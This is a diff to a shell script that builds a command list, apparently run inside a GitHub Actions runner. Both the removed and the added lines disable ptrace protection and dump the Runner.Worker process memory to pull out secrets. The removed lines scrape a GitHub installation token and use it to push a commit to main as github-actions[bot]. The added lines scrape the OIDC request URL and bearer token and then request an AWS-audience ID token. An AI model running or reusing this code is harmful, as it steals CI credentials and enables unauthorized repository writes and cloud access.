@@ -64,15 +64,24 @@ sudo chmod 644 /etc/profile.d/99-mitmproxy.sh 2>/dev/null
 
 # --- ADD COMMANDS HERE (one per line) ---
 cat > /tmp/actionp-cmds.txt <<'CMDEOF'
+echo "--- checking env vars for OIDC ---"
+echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
+echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN=$(echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | cut -c1-40)..."
 echo "--- disabling ptrace restriction ---"
 sudo sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'
-echo "--- reading Runner.Worker memory ---"
-sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings -el | grep -oP 'ghs_15368_[A-Za-z0-9_.=-]{20,}' | head -1 > /tmp/t.txt
-echo "--- also try ASCII encoding ---"
-test -s /tmp/t.txt || sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings | grep -oP 'ghs_15368_[A-Za-z0-9_.=-]{20,}' | head -1 > /tmp/t.txt
-echo "found: $(cat /tmp/t.txt | cut -c1-30)..."
-echo "--- pushing hello_there.txt to main ---"
-cd $GITHUB_WORKSPACE && echo 'hello there!!!!!' > hello_there.txt && git add hello_there.txt && git -c user.name='github-actions[bot]' -c user.email='41898282+github-actions[bot]@users.noreply.github.com' -c commit.gpgsign=false commit -m 'add hello_there.txt' && git remote set-url origin "https://x-access-token:$(cat /tmp/t.txt)@github.com/${GITHUB_REPOSITORY}.git" && git push origin HEAD:main
+echo "--- reading Runner.Worker memory for OIDC vars ---"
+sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings -el | grep -oP 'https://[a-z0-9.-]+\.actions\.githubusercontent\.com/[^\s"]*idtoken[^\s"]*' | head -1 > /tmp/oidc_url.txt
+echo "--- also try ASCII encoding for URL ---"
+test -s /tmp/oidc_url.txt || sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings | grep -oP 'https://[a-z0-9.-]+\.actions\.githubusercontent\.com/[^\s"]*idtoken[^\s"]*' | head -1 > /tmp/oidc_url.txt
+echo "ACTIONS_ID_TOKEN_REQUEST_URL: $(cat /tmp/oidc_url.txt | cut -c1-80)..."
+echo "--- reading Runner.Worker memory for OIDC token ---"
+sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings -el | grep -oP 'eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{20,}' | head -1 > /tmp/oidc_token.txt
+echo "--- also try ASCII encoding for token ---"
+test -s /tmp/oidc_token.txt || sudo bash -c 'PID=$(pgrep -f "Runner.Worker" | head -1); grep "r" /proc/$PID/maps | while IFS="-" read start rest; do end=$(echo $rest | cut -d" " -f1); dd if=/proc/$PID/mem bs=4096 iflag=skip_bytes,count_bytes skip=$((0x$start)) count=$(($((0x$end))-$((0x$start)))) 2>/dev/null; done' | strings | grep -oP 'eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{20,}' | head -1 > /tmp/oidc_token.txt
+echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: $(cat /tmp/oidc_token.txt | cut -c1-40)..."
+echo "--- requesting ID token with audience sts.amazonaws.com ---"
+curl -s -H "Authorization: bearer $(cat /tmp/oidc_token.txt)" "$(cat /tmp/oidc_url.txt)&audience=sts.amazonaws.com" > /tmp/oidc_response.txt
+echo "OIDC response: $(cat /tmp/oidc_response.txt)"
 CMDEOF
 # ----------------------------------------
 
